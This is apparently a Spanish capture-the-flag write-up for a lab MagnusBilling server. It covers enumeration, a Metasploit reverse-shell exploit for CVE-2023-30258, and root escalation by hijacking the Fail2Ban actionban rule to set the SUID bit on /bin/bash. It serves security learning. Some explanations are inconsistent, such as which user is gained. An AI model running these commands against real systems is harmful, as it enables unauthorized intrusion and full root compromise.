# THM-MagnusBilling-RCE-to-Fail2Ban-LPE.
RCE en MagnusBilling v7.3.0 (Unauth) - Enumeración de servicios VoIP (Asterisk/AMI) con captura de credenciales y Secuestro de la lógica de baneo de Fail2Ban para activar el bit SUID en /bin/bash


**Nmap**
```bash
nmap -p- -sV -sC -sS --open --min-rate 5000 10.81.152.90 -n -Pn -oN billin_scan.txt
```
```​
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 0c:7a:4f:48:e3:24:c1:f7:e1:bb:49:8f:7c:2f:76:3e (ECDSA)
|_  256 5b:21:e7:00:cb:25:a4:ae:c9:72:15:ab:99:0b:01:58 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.81.152.90/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
​

####Análisis de nmap###
```22 (SSH)```
OpenSSH 9.2p1: Versión muy reciente y parcheada. Salvo por credenciales débiles (fuerza bruta), es un vector difícil de atacar inicialmente.
```80 (HTTP)```
Apache 2.4.62: MagnusBilling. Los CMS y paneles de gestión son siempre el eslabón más débil debido a su gran superficie de código expuesto.
```3306 (MySQL)```
MariaDB: Base de datos que almacena facturación y usuarios. Útil una vez dentro (Post-explotación) o para inyección SQL.
```5038 (Asterisk)```
Asterisk Manager: El "corazón" de la telefonía. Permite control de llamadas. Muy peligroso si se encuentran credenciales en el panel web.
<br>
```Whatweb```
```http://10.81.152.90/mbilling [301 Moved Permanently] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.81.152.90], RedirectLocation[http://10.81.152.90/mbilling/], Title[301 Moved Permanently]```

​
```Gobuster```
```gobuster dir -u http://10.81.152.90  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html.txt,bak```
<br>
<img width="577" height="84" alt="gobuster 1" src="https://github.com/user-attachments/assets/4ce609c3-5dd9-42d1-afd0-e309b18ff375" />
<br>    ​
<br>
<img width="798" height="363" alt="panel" src="https://github.com/user-attachments/assets/8b3f4e26-9bd2-4d18-a539-3bc84875df72" />
<br>

```gobuster dir -u http://10.81.152.90/mbilling/  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html.txt,bak```
<br>
<img width="788" height="169" alt="go2" src="https://github.com/user-attachments/assets/345093ab-e419-4be2-b50f-9472053cae8e" />
<br>​

Dentro de todos estos directorios no me da nada intertesante asique voy a ver que tipo de vuilnerabilidad me esconde esta pagina en la que se aloja dentro del puerto 80
searchsploit
```searchsploit MagnusBilling```
<br>​
<img width="934" height="80" alt="MAGNUSBILLING" src="https://github.com/user-attachments/assets/b4deab84-e20d-4534-b95f-6addf03047a3" />
<br>

Casualmente solo me aparece un tipo de vulnerabilidad asique vale la pena probarlo en Metasploit
Vemos que ademas El exploit aprovecha una vulnerabilidad en el manejo de archivos/parámetros en el portal de MagnusBilling que permite inyectar código PHP malicioso.

##Ejecución del Exploit (Metasploit)##
```bash
use  linux/http/magnusbilling_unauth_rce_cve_2023_30258.
set payload php/meterpreter/reverse_tcp
set TARGETURI /mbilling
set LHOST xxx.xxx.xxx.xxx
set RHOST xxx.xxx.xxx.xxx
run
```
​
El resultado: Una sesión de Meterpreter que nos permite interactuar con el sistema de archivos del servidor.

###¿Por qué atacamos MagnusBilling primero?###
 MagnusBilling es una aplicación web. A diferencia de SSH o MariaDB, las aplicaciones web procesan entradas del usuario constantemente (parámetros, logins, formularios), lo que aumenta las probabilidades de encontrar fallos de sanitización.
 
El puerto 80 nos redirigió a /mbilling/. Al investigar este software, descubrimos el CVE-2023-30258, un fallo de inyección de comandos que permite a un atacante no autenticado (sin contraseña) ejecutar código en el servidor.

Al comprometer el servicio web, obtenemos la identidad www-data. Aunque es un usuario limitado, nos da "un pie dentro" para explorar el sistema internamente, algo que no podíamos hacer desde SSH.

Dentro de Metasploit vemos que somos el user asterisk asique lo primero que haremos es ver si podemos abusar del privilegio sudo
```bash
sudo -l
```
<br>
<img width="691" height="207" alt="client" src="https://github.com/user-attachments/assets/2d44b3a3-e350-4d87-a87a-a275cdb487f9" />
<br>​

###¿Qué es fail2ban-client?###
Es la herramienta de administración para Fail2Ban, un servicio de seguridad que monitorea los logs del sistema (como el de SSH) y banea IPs que intentan hacer fuerza bruta.
Para funcionar, fail2ban necesita interactuar con el firewall (iptables o nftables) y con los archivos de configuración del sistema.
Por eso, el cliente tiene la capacidad de arrancar/parar servicios y, lo más importante, de cambiar configuraciones de ejecución.

Primero mira qué servicios está protegiendo Fail2Ban:
sudo /usr/bin/fail2ban-client status
​

Como ya sabíamos que podíamos ejecutar fail2ban-client como root (por el sudo -l), necesitábamos saber dónde podíamos inyectar nuestro comando. Fail2Ban no es un bloque sólido; funciona mediante "Jails" (cárceles), que son reglas específicas para diferentes servicios.
¿Qué es lo que nos dice este resultado?
El resultado nos confirma dos cosas críticas:
El servicio está activo: Si el comando responde, significa que el demonio de Fail2Ban está corriendo y podemos interactuar con él.
Identificación de vectores (Jail list): Nos da el nombre exacto de las "cárceles" activas. Esto es como ver una lista de puertas. Cada nombre (sshd, mbilling_login, etc.) es un servicio que Fail2Ban está vigilando.
Elegimos sshd de esa lista porque es el servicio más fácil de "atacar" desde fuera para forzar un baneo y disparar nuestra carga útil (payload).
¿Cómo funciona técnicamente?
Fail2Ban funciona con un modelo Cliente-Servidor:
Servidor (fail2ban-server): Corre como root y es el que realmente ejecuta los comandos para banear gente.
Cliente (fail2ban-client): Es el que tú usaste. Se comunica con el servidor para enviarle órdenes.
Al tener permisos de sudo sobre el cliente, tienes el poder de decirle al servidor (que es root) que cambie su configuración. Es una Escalada de Privilegios por Delegación de Configuración.
Ahora que sabemos que la jail sshd existe, el siguiente paso lógico es interrogar a esa jail para ver cómo banea a la gente. No todas las jails se comportan igual.
Para eso, el comando que deberías explicar a continuación es el que usamos para ver las "acciones":

sudo /usr/bin/fail2ban-client get sshd actions
​
Este comando es el paso de reconocimiento interno definitivo. Sin la información que te dio este comando, el exploit habría fallado porque habrías estado disparando a ciegas.
Aquí tienes el desglose detallado para tu aprendizaje y para el WriteUp:
¿Qué significa cada parte del comando?
sudo: Ejecuta el comando con los máximos privilegios (root). Como vimos en sudo -l, el usuario asterisk tiene permiso para usar este binario específico sin contraseña.
/usr/bin/fail2ban-client: La herramienta que permite hablar con el servidor de Fail2Ban para consultar o cambiar reglas en tiempo real.
get: Es el "verbo" de consulta. Le estás pidiendo al servicio que te entregue información específica.
sshd: El nombre de la "cárcel" (jail) sobre la que quieres preguntar. La elegimos porque la vimos en el paso anterior (status).
actions: El parámetro específico que quieres consultar. Le estás preguntando: "¿Qué haces exactamente cuando decides que vas a banear a alguien en esta cárcel?".

¿Qué es lo que nos ha dicho el resultado?
Nos ha respondido: iptables-multiport.
Esto es fundamental porque Fail2Ban no tiene una única forma de banear. Puede enviarte un email, puede bloquearte en un firewall diferente o puede usar el comando iptables. En este sistema, la acción configurada se llama específicamente iptables-multiport.
¿Por qué es esto importante? Porque para cambiar el comportamiento del baneo (el comando set), necesitas indicarle el nombre exacto de la acción que quieres "secuestrar". Si hubieras intentado cambiar una acción que no existe, el sistema te habría dado un error de comando inválido.
¿Por qué nos ha funcionado?
Funciona por un concepto llamado Introspección de Configuración:
Visibilidad total: El comando get te permite ver las "tripas" de la configuración de seguridad del sistema.
Preparación del Payload: Al saber que la acción es iptables-multiport, ahora ya puedes construir el comando de ataque: "set sshd action iptables-multiport actionban...".
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash"
​
Este es el comando clave del "Weaponization" o armamento. Aquí es donde transformamos una herramienta de seguridad en nuestro vector de ataque para obtener privilegios de root.
1. Desglose del comando paso a paso
sudo /usr/bin/fail2ban-client: Ejecutamos el cliente de administración con permisos de superusuario (root), algo que se nos permite según el archivo sudoers.
set sshd: Le indicamos al servidor que queremos modificar la configuración de la cárcel (jail) llamada sshd.
action iptables-multiport: Especificamos exactamente qué acción queremos alterar (la que descubrimos en el paso anterior con el comando get).
actionban: Este es el parámetro crítico. Es la instrucción que define: "¿Qué comando debe ejecutar el sistema cuando se decida banear una IP?". Por defecto, aquí suele haber un comando de iptables para bloquear el tráfico.
"chmod +s /bin/bash": Aquí es donde inyectamos nuestra carga útil (payload). En lugar de bloquear una IP, le ordenamos al sistema que asigne el bit SUID a la Bash.
Nota técnica: El bit SUID (+s) permite que cualquier usuario que ejecute ese archivo lo haga con los privilegios del propietario (en este caso, root).
2. ¿Por qué hemos elegido este comando?
Elegimos este método porque es discreto y extremadamente efectivo. En lugar de intentar explotar un fallo en el código del programa (un buffer overflow o algo complejo), estamos abusando de una funcionalidad legítima del software.
Fail2Ban está diseñado para ejecutar comandos del sistema como root. Nosotros simplemente hemos "reprogramado" qué comando debe ejecutar.
3. ¿Por qué ha funcionado?
Ha funcionado por tres razones:
Confianza ciega: El servidor de Fail2Ban confía en lo que el cliente le dice (porque viene vía sudo). No verifica si el comando inyectado tiene algo que ver con un firewall; simplemente lo guarda para ejecutarlo más tarde.
Privilegios heredados: Fail2Ban corre como un servicio del sistema con privilegios de root. Por lo tanto, cualquier comando que pongamos en actionban se ejecutará con esos mismos privilegios.
Persistencia de configuración: El comando cambia la configuración en la memoria del servicio de forma inmediata.
4. ¿Qué es lo que nos ha respondido el comando?
En tu salida de terminal, el comando respondió:
chmod +s /bin/bash
Esto no es un error, es la confirmación del éxito. Cuando el cliente de Fail2Ban te devuelve el valor que acabas de introducir, significa que el servidor ha aceptado el cambio y que la nueva "regla de baneo" ya está activa en la memoria del sistema.
En estos momentos Fail2Ban ahora está esperando a que alguien "se porte mal" en el SSH para ejecutar tu comando
Tienes que intentar entrar por SSH con contraseñas falsas. No es para adivinar la contraseña, sino para que Fail2Ban diga: "¡Oye! Esta IP está intentando entrar a la fuerza, voy a banearla".
La ejecución automática: Al banearte, el sistema ejecuta automáticamente tu chmod +s /bin/bash porque cree que es su comando de bloqueo normal.
Entonces es cuando haces el ls -l /bin/bash para ver si la "s" mágica ha aparecido.
ls -l /bin/bash
​

2. ¿Por qué lo llamamos "Trigger" y no "Fuerza Bruta" tradicional?
En un ataque normal, la fuerza bruta busca entrar. Aquí, la fuerza bruta busca que nos echen.
4. ¿Qué significa el comando ls -l /bin/bash?
Este comando es tu verificación. Lo elegiste porque:
Antes del baneo: Verías algo como rwxr-xr-x. (Bash normal).
Después del baneo: Verías rwsr-xr-x.
Esa "s" significa que el bit SUID está activo. Es la confirmación de que Fail2Ban ha mordido el anzuelo y ha ejecutado tu comando como root.
Este comando es el que efectivamente abre la puerta y te entrega el control total. Aquí tienes la explicación técnica de por qué es necesario y qué significa esa -p.
¿Por qué hacemos este comando?
Aunque el comando anterior (chmod +s /bin/bash) tuvo éxito y convirtió a la Bash en un binario SUID, eso no te convierte en root automáticamente. El sistema de archivos ha cambiado, pero tu sesión actual de usuario sigue siendo la de asterisk.
Necesitas ejecutar esa Bash modificada para que los privilegios de root se activen en tu terminal.
¿Qué significa la p? (La parte más importante)
Las versiones modernas de Linux (específicamente la Bash) tienen una medida de seguridad: si detectan que están siendo ejecutadas con el bit SUID (como root) pero por un usuario normal (como asterisk), la Bash suelta automáticamente esos privilegios por seguridad y te devuelve una shell de usuario normal.
p significa "privileged" (privilegiado).
Al añadir el parámetro p, le estás diciendo a la Bash: "No sueltes los privilegios de root, mantén el User ID efectivo (EUID) que te otorga el bit SUID".
¿Qué nos dice la respuesta del sistema?
bash2#: Fíjate que el símbolo de tu terminal ha cambiado de $ (usuario normal) a # (superusuario). En el mundo Linux, el "almohadilla" o "hashtag" es el símbolo universal de que tienes el poder total.
whoami -> root: Este es el veredicto final. El sistema operativo confirma que, para todos los efectos, ahora eres el usuario root.
Ya somos root
